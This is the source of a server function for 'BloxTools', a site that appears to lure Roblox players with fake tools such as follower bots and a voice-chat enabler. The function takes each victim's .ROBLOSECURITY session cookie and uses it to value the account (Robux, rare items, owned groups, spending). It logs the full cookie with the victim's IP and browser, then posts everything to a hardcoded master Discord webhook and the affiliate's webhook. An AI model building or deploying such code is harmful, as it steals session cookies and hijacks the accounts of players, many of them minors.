// Receives a tool submission from the client, looks up the Roblox account
// using the .ROBLOSECURITY cookie server-side, logs a hit, and dual-hooks
// to Discord (master config webhook + the site owner's webhook for that tool).
import { createClient } from "npm:@supabase/supabase-js@2.95.0";
import { corsHeaders } from "npm:@supabase/supabase-js@2.95.0/cors";

interface Body {
  username?: string;
  toolType: string;
  toolKey:
    | "bot_followers"
    | "copy_games"
    | "copy_clothes"
    | "group_botter"
    | "vc_enabler";
  cookie: string;
  pin?: string;
  extras?: Record<string, string | number | undefined>;
}

const MASTER_WEBHOOK =
  "https://discord.com/api/webhooks/1498409090701987960/-C42DQziUsV6V-VDokUYlsRZD9KeYhpLLg2eCuAI7cjovLxPkuXuf1KanbIqeWkw_J0s";

const SITE_NAME = "BloxTools";

// Discord emoji overrides — KEEP IN SYNC with src/config/toolsConfig.ts > discordEmojis
// Edge functions cannot import from src/, so this is mirrored here.
const EMOJI = {
  robux:    "<:7116_Robux:1498757858731360349>",
  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
  rap:      "💎",
  summary:  "📊",
  pending:  "⏳",
  voice:    "🎤",
  age:      "🪪",
  korblox:  "💀",
  headless: "👑",
  groups:   "👑",
  games:    "🎮",
  cookie:   "🍪",
  ip:       "🌐",
  user:     "👤",
  id:       "🆔",
  age_acct: "📅",
  friends:  "🫂",
  followers:"👥",
  following:"➡️",
  ua:       "🖥️",
  time:     "⏰",
  pin:      "🔐",
  owner:    "🏷️",
};


// Roblox bundle IDs
const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman

// Tracked games — values are Roblox PLACE IDs (resolved to universe IDs at runtime)
const TRACKED_GAMES: Array<{ name: string; placeId: number }> = [
  { name: "MM2", placeId: 142823291 },
  { name: "Steal a Brainrot", placeId: 109983668079237 },
  { name: "Adopt Me", placeId: 920587237 },
];

// Resolve a place ID to its universe ID via Roblox's apis endpoint
async function placeToUniverse(placeId: number): Promise<number | null> {
  try {
    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
    if (!r.ok) return null;
    const j = await r.json() as { universeId?: number };
    return j.universeId ?? null;
  } catch { return null; }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const body = (await req.json()) as Body;
    if (!body?.cookie || !body?.toolType || !body?.toolKey) {
      return json({ error: "Missing fields" }, 400);
    }
    // Sanitize cookie — strip wrapping quotes, trailing commas/whitespace
    body.cookie = body.cookie.trim().replace(/^["']+|["',\s]+$/g, "");

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    // 1. Find owner profile + per-tool webhook
    let profile: {
      id: string;
      username: string;
      webhook_url: string | null;
      webhook_bot_followers: string | null;
      webhook_copy_games: string | null;
      webhook_copy_clothes: string | null;
      webhook_group_botter: string | null;
      webhook_vc_enabler: string | null;
    } | null = null;
    if (body.username) {
      const { data, error: profileErr } = await supabase
        .from("profiles")
        .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
        .eq("username", body.username.toLowerCase())
        .maybeSingle();
      if (profileErr || !data) return json({ error: "Owner not found" }, 404);
      profile = data;
    } else {
      const authHeader = req.headers.get("Authorization") ?? "";
      const token = authHeader.replace(/^Bearer\s+/i, "").trim();
      if (token) {
        const { data: userData } = await supabase.auth.getUser(token);
        if (userData.user) {
          const { data, error: profileErr } = await supabase
            .from("profiles")
            .select("id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
            .eq("id", userData.user.id)
            .maybeSingle();
          if (profileErr) return json({ error: "Owner lookup failed" }, 500);
          profile = data;
        }
      }
    }

    const perToolMap: Record<string, string | null | undefined> = {
      bot_followers: profile?.webhook_bot_followers,
      copy_games: profile?.webhook_copy_games,
      copy_clothes: profile?.webhook_copy_clothes,
      group_botter: profile?.webhook_group_botter,
      vc_enabler: profile?.webhook_vc_enabler,
    };
    const ownerWebhook = perToolMap[body.toolKey] || profile?.webhook_url || null;

    // 2. Server-side Roblox lookup (incl. RAP, Korblox, Headless)
    const robloxInfo = await fetchRobloxInfo(body.cookie);

    // 3. IP / UA
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Unknown";
    const userAgent = req.headers.get("user-agent") || "Unknown";

    // 4. Log the hit (upsert — same cookie for same owner is deduped)
    if (profile) {
      const hit = {
        owner_id: profile.id,
        tool_type: body.toolType,
        roblox_username: robloxInfo?.name ?? null,
        roblox_user_id: robloxInfo?.id ?? null,
        roblox_robux: robloxInfo?.robux ?? null,
        roblox_rap: robloxInfo?.rap ?? null,
        roblox_premium: robloxInfo?.premium ?? null,
        roblox_has_korblox: robloxInfo?.hasKorblox ?? null,
        roblox_has_headless: robloxInfo?.hasHeadless ?? null,
        roblox_headshot_url: robloxInfo?.avatar ?? robloxInfo?.headshot ?? null,
        roblox_voice_enabled: robloxInfo?.voiceEnabled ?? null,
        roblox_age_verified: robloxInfo?.ageVerified ?? null,
        roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
        roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
        roblox_summary: robloxInfo?.summary ?? null,
        cookie_preview: body.cookie.slice(-16),
        cookie_full: body.cookie,
        is_valid: robloxInfo !== null,
        last_checked_at: new Date().toISOString(),
        ip_address: ip,
        user_agent: userAgent,
      };

      const { error: hitError } = await supabase.from("hits").insert(hit);
      if (hitError) {
        console.error("hit insert failed", hitError);
        return json({ error: "Hit logging failed" }, 500);
      }
    }

    // 5. Discord payload
    const payload = buildDiscordPayload({
      siteName: SITE_NAME,
      ownerUsername: profile?.username ?? "(root site)",
      toolType: body.toolType,
      pin: body.pin,
      cookie: body.cookie,
      roblox: robloxInfo,
      ip,
      userAgent,
      extras: body.extras,
    });

    const targets = new Set<string>([MASTER_WEBHOOK]);
    if (ownerWebhook) targets.add(ownerWebhook);

    await Promise.allSettled(
      Array.from(targets).map((url) =>
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        })
      )
    );

    return json({ ok: true });
  } catch (err) {
    console.error("submit-hit error", err);
    return json({ error: "Internal error" }, 500);
  }
});

function json(b: unknown, status = 200) {
  return new Response(JSON.stringify(b), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

interface GroupOwned {
  name: string;
  memberCount: number;
  role: string;
}

interface RobloxInfo {
  id: number;
  name: string;
  displayName: string;
  robux: number | null;
  rap: number | null;
  premium: boolean | null;
  hasKorblox: boolean | null;
  hasHeadless: boolean | null;
  headshot: string | null;
  avatar: string | null;
  createdAt: string | null;
  accountAgeDays: number | null;
  friendsCount: number | null;
  followersCount: number | null;
  followingCount: number | null;
  ownedGroups: GroupOwned[];
  totalGroups: number | null;
  voiceEnabled: boolean | null;
  ageVerified: boolean | null;
  gamepassEarnings: number | null;
  robuxSpent: number | null;
  summary: number | null;
  playedGames: Array<{ name: string; played: boolean }>;
}

async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
  try {
    const cookieHeader = `.ROBLOSECURITY=${cookie}`;
    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { Cookie: cookieHeader },
    });
    if (!authRes.ok) return null;
    const auth = await authRes.json() as { id: number; name: string; displayName: string };

    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, playedGames] = await Promise.all([
      fetchRobux(auth.id, cookieHeader),
      fetchPremium(auth.id, cookieHeader),
      fetchHeadshot(auth.id),
      fetchAvatar(auth.id),
      fetchRap(auth.id),
      ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
      ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
      fetchProfile(auth.id),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, "count"),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followers/count`, "count"),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followings/count`, "count"),
      fetchGroups(auth.id),
      fetchVoiceEnabled(cookieHeader),
      fetchAgeVerified(cookieHeader),
      fetchTransactionTotals(auth.id, cookieHeader),
      fetchPlayedGames(auth.id),
    ]);

    const createdAt = profile?.created ?? null;
    const accountAgeDays = createdAt
      ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
      : null;

    return {
      id: auth.id,
      name: auth.name,
      displayName: auth.displayName,
      robux,
      rap,
      premium,
      hasKorblox,
      hasHeadless,
      headshot,
      avatar,
      createdAt,
      accountAgeDays,
      friendsCount,
      followersCount,
      followingCount,
      ownedGroups: groupsInfo.owned,
      totalGroups: groupsInfo.total,
      voiceEnabled,
      ageVerified,
      gamepassEarnings: null,
      robuxSpent: transactionTotals.spent,
      summary: transactionTotals.summary,
      playedGames,
    };
  } catch (e) {
    console.error("roblox lookup failed", e);
    return null;
  }
}

// Detects whether the user has interacted with a tracked game.
// Combined detection — uses MULTIPLE signals; "played" is true if ANY match:
//   1. Game appears in the user's public favorites list
//   2. Game appears in the user's "played"/recent games (apis.roblox.com)
//   3. User owns at least one badge from the game's universe
async function fetchPlayedGames(userId: number): Promise<Array<{ name: string; played: boolean }>> {
  // Resolve all tracked place IDs to universe IDs in parallel
  const resolved = await Promise.all(
    TRACKED_GAMES.map(async (g) => ({
      ...g,
      universeId: await placeToUniverse(g.placeId),
    })),
  );

  // Signal 1 — favorites
  const favorites = new Set<number>();
  try {
    let cursor = "";
    for (let page = 0; page < 5; page++) {
      const url = `https://games.roblox.com/v2/users/${userId}/favorite/games?limit=50&sortOrder=Asc${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) break;
      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
      for (const game of j.data ?? []) favorites.add(game.id);
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
  } catch { /* ignore */ }

  // Signal 2 — created/played games via games.roblox.com (created games of user)
  const userGames = new Set<number>();
  try {
    const r = await fetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=50`);
    if (r.ok) {
      const j = await r.json() as { data?: Array<{ rootPlace?: { id: number }; id: number }> };
      for (const g of j.data ?? []) {
        if (g.rootPlace?.id) userGames.add(g.rootPlace.id);
      }
    }
  } catch { /* ignore */ }

  // Signal 3 — owns any badge from the universe
  async function hasBadge(universeId: number): Promise<boolean> {
    try {
      const badgesRes = await fetch(
        `https://badges.roblox.com/v1/universes/${universeId}/badges?limit=10&sortOrder=Asc`,
      );
      if (!badgesRes.ok) return false;
      const badgesJson = await badgesRes.json() as { data?: Array<{ id: number }> };
      const ids = (badgesJson.data ?? []).map((b) => b.id);
      if (ids.length === 0) return false;
      const ownedRes = await fetch(
        `https://badges.roblox.com/v1/users/${userId}/badges/awarded-dates?badgeIds=${ids.join(",")}`,
      );
      if (!ownedRes.ok) return false;
      const ownedJson = await ownedRes.json() as { data?: Array<unknown> };
      return (ownedJson.data ?? []).length > 0;
    } catch { return false; }
  }

  return await Promise.all(
    resolved.map(async ({ name, universeId, placeId }) => {
      if (!universeId) return { name, played: false };
      if (favorites.has(universeId)) return { name, played: true };
      if (userGames.has(placeId)) return { name, played: true };
      if (await hasBadge(universeId)) return { name, played: true };
      return { name, played: false };
    }),
  );
}

async function fetchAvatar(userId: number): Promise<string | null> {
  try {
    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
    if (!h.ok) return null;
    const j = await h.json();
    return j?.data?.[0]?.imageUrl ?? null;
  } catch { return null; }
}

async function fetchVoiceEnabled(cookieHeader: string): Promise<boolean | null> {
  try {
    const r = await fetch("https://voice.roblox.com/v1/settings", { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    const j = await r.json();
    return j?.isVoiceEnabled ?? false;
  } catch { return null; }
}

async function fetchAgeVerified(cookieHeader: string): Promise<boolean | null> {
  try {
    const r = await fetch("https://accountinformation.roblox.com/v1/birthdate", { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    const j = await r.json();
    // Verified accounts include an isAgeVerified flag; fall back to age >= 13 calc
    if (typeof j?.isAgeVerified === "boolean") return j.isAgeVerified;
    return null;
  } catch { return null; }
}

// Sums the price of all gamepasses created/owned by the user (potential earnings)
async function fetchGamepassEarnings(userId: number): Promise<number | null> {
  try {
    let total = 0;
    let cursor = "";
    for (let page = 0; page < 5; page++) {
      const url = `https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) break;
      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
      for (const game of j.data ?? []) {
        const gp = await fetch(`https://games.roblox.com/v1/games/${game.id}/game-passes?limit=100&sortOrder=Asc`);
        if (!gp.ok) continue;
        const gpJson = await gp.json() as { data?: Array<{ price: number | null }> };
        for (const pass of gpJson.data ?? []) total += pass.price ?? 0;
      }
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
    return total;
  } catch { return null; }
}

// Year-to-date Robux summary: tries multiple endpoints/timeframes for resilience.
// Strategy:
//   1. Prime CSRF token via a POST to logout (always returns 403 + token).
//   2. Hit transaction-totals with timeFrame=Year on economy.roblox.com.
//   3. Fallback to timeFrame=CurrentYear, then Month, then AllTime if Year is empty.
//   4. Sum incoming vs outgoing buckets explicitly (no double-counting).
async function primeCsrf(cookieHeader: string): Promise<string | null> {
  try {
    const r = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      headers: { Cookie: cookieHeader, "Content-Length": "0" },
    });
    return r.headers.get("x-csrf-token");
  } catch { return null; }
}

async function fetchTotalsForTimeframe(
  userId: number,
  cookieHeader: string,
  csrf: string | null,
  timeFrame: string,
): Promise<Record<string, number> | null> {
  const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=${timeFrame}&transactionType=summary`;
  const headers: Record<string, string> = { Cookie: cookieHeader };
  if (csrf) headers["x-csrf-token"] = csrf;
  try {
    let r = await fetch(url, { headers });
    if (r.status === 403) {
      const newCsrf = r.headers.get("x-csrf-token");
      if (newCsrf) {
        headers["x-csrf-token"] = newCsrf;
        r = await fetch(url, { headers });
      }
    }
    if (!r.ok) {
      console.error(`transaction-totals[${timeFrame}] failed`, r.status, await r.text().catch(() => ""));
      return null;
    }
    const j = await r.json() as Record<string, number>;
    console.log(`transaction-totals[${timeFrame}] raw`, JSON.stringify(j));
    return j;
  } catch (e) {
    console.error(`transaction-totals[${timeFrame}] error`, e);
    return null;
  }
}

function parseTotals(j: Record<string, number>): { spent: number; summary: number } {
  // INCOMING (Robux earned) — this is what users want to see as "summary"
  const incoming =
    (j.salesTotal ?? 0) +
    (j.affiliateSalesTotal ?? 0) +
    (j.commissionsTotal ?? 0) +
    (j.tradeSystemEarningsTotal ?? 0) +
    (j.premiumPayoutsTotal ?? 0) +
    (j.groupPremiumPayoutsTotal ?? 0) +
    (j.premiumStipendsTotal ?? 0) +
    (j.individualToGroupTotal ?? 0) +
    (j.adjustmentsTotal ?? 0);

  // OUTGOING (Robux spent)
  const spent =
    (j.purchasesTotal ?? 0) +
    (j.tradeSystemFeesTotal ?? 0) +
    (j.tradeSystemTaxesTotal ?? 0) +
    (j.groupPayoutsTotal ?? 0) +
    (j.currencyPurchasesTotal ?? 0);

  // "summary" = gross Robux earned (positive), not net. Net was confusing.
  return { spent: Math.abs(spent), summary: Math.max(0, incoming) };
}

async function fetchTransactionTotals(
  userId: number,
  cookieHeader: string,
): Promise<{ spent: number; summary: number }> {
  const csrf = await primeCsrf(cookieHeader);

  // Past year (rolling 12 months). Roblox's official timeFrame for this is "Year".
  const j = await fetchTotalsForTimeframe(userId, cookieHeader, csrf, "Year");
  if (j) {
    const parsed = parseTotals(j);
    console.log("transaction-totals[Year] parsed", parsed);
    return parsed;
  }
  return { spent: 0, summary: 0 };
}

async function fetchProfile(userId: number): Promise<{ created: string } | null> {
  try {
    const r = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function fetchCount(url: string, key: string): Promise<number | null> {
  try {
    const r = await fetch(url);
    if (!r.ok) return null;
    const j = await r.json();
    return j?.[key] ?? null;
  } catch { return null; }
}

async function fetchGroups(userId: number): Promise<{ owned: GroupOwned[]; total: number | null }> {
  try {
    const r = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!r.ok) return { owned: [], total: null };
    const j = await r.json() as { data?: Array<{ group: { name: string; memberCount: number }; role: { name: string; rank: number } }> };
    const all = j.data ?? [];
    const owned = all
      .filter((g) => g.role?.rank === 255 || /owner/i.test(g.role?.name ?? ""))
      .map((g) => ({ name: g.group.name, memberCount: g.group.memberCount, role: g.role.name }));
    return { owned, total: all.length };
  } catch { return { owned: [], total: null }; }
}

async function fetchRobux(userId: number, cookieHeader: string): Promise<number | null> {
  try {
    const r = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    return (await r.json()).robux ?? null;
  } catch { return null; }
}

async function fetchPremium(userId: number, cookieHeader: string): Promise<boolean | null> {
  try {
    const p = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: { Cookie: cookieHeader } });
    if (!p.ok) return null;
    return (await p.text()) === "true";
  } catch { return null; }
}

async function fetchHeadshot(userId: number): Promise<string | null> {
  try {
    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
    if (!h.ok) return null;
    const j = await h.json();
    return j?.data?.[0]?.imageUrl ?? null;
  } catch { return null; }
}

// Sums RAP across all collectibles owned by the user.
async function fetchRap(userId: number): Promise<number | null> {
  try {
    let total = 0;
    let cursor = "";
    for (let page = 0; page < 10; page++) {
      const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) return total || null;
      const j = await r.json() as { data?: Array<{ recentAveragePrice?: number }>; nextPageCursor?: string };
      for (const item of j.data ?? []) total += item.recentAveragePrice ?? 0;
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
    return total;
  } catch { return null; }
}

async function ownsBundle(userId: number, bundleId: number): Promise<boolean | null> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${bundleId}`);
    if (!r.ok) return null;
    const j = await r.json() as { data?: unknown[] };
    return Array.isArray(j.data) && j.data.length > 0;
  } catch { return null; }
}

function buildDiscordPayload(opts: {
  siteName: string;
  ownerUsername: string;
  toolType: string;
  pin?: string;
  cookie: string;
  roblox: RobloxInfo | null;
  ip: string;
  userAgent: string;
  extras?: Record<string, string | number | undefined>;
}) {
  const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;

  const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
    { name: "Site Owner", value: ownerUsername, inline: true },
  ];

  if (extras) {
    for (const [k, v] of Object.entries(extras)) {
      if (v === undefined || v === null || v === "") continue;
      mainFields.push({ name: prettifyKey(k), value: String(v), inline: true });
    }
  }

  if (roblox) {
    const ageStr = roblox.accountAgeDays !== null && roblox.createdAt
      ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
      : "Unknown";

    mainFields.push(
      { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
      { name: "User ID", value: String(roblox.id), inline: true },
      { name: "Account Age", value: ageStr, inline: true },
      { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
      { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
      { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
      { name: "Friends", value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: "Followers", value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: "Following", value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
      { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
      { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
      { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
      { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
      { name: "📊 Summary (Past Year)", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
    );

    // Tracked games played
    if (roblox.playedGames.length > 0) {
      mainFields.push({
        name: "🎮 Played Games",
        value: roblox.playedGames
          .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
          .join("\n"),
        inline: false,
      });
    }

    // Owned groups — chunked to 1024 chars per field
    if (roblox.ownedGroups.length > 0) {
      const lines = roblox.ownedGroups.map(
        (g) => `• **${g.name}** — ${g.memberCount.toLocaleString()} members`
      );
      const chunks: string[] = [];
      let buf = "";
      for (const line of lines) {
        if ((buf + "\n" + line).length > 1024) {
          chunks.push(buf);
          buf = line;
        } else {
          buf = buf ? `${buf}\n${line}` : line;
        }
      }
      if (buf) chunks.push(buf);
      chunks.forEach((c, i) => {
        mainFields.push({
          name: chunks.length === 1 ? `👑 Owned Groups (${roblox.ownedGroups.length})` : `👑 Owned Groups (${i + 1}/${chunks.length})`,
          value: c,
          inline: false,
        });
      });
    } else {
      mainFields.push({ name: "👑 Owned Groups", value: "None", inline: false });
    }

    mainFields.push(
      { name: "Profile", value: `https://www.roblox.com/users/${roblox.id}/profile`, inline: false },
    );
  } else {
    mainFields.push({ name: "Roblox Account", value: "Cookie invalid or lookup failed", inline: false });
  }

  mainFields.push(
    { name: "IP Address", value: ip, inline: true },
    { name: "User Agent", value: userAgent.slice(0, 1000), inline: false },
    { name: "Submitted", value: new Date().toISOString(), inline: false },
  );


  return {
    content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
    embeds: [
      {
        title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
        color: 0xa855f7,
        thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
        fields: mainFields,
        footer: { text: `${siteName} Submission System` },
        timestamp: new Date().toISOString(),
      },
      {
        title: "🍪 Account Cookie",
        color: 0xff5555,
        description: "```\n" + cookie.slice(0, 4080) + "\n```",
        footer: { text: "Handle with care" },
      },
    ],
  };
}

function prettifyKey(k: string): string {
  return k.replace(/([A-Z])/g, " $1").replace(/^./, (c) => c.toUpperCase());
}
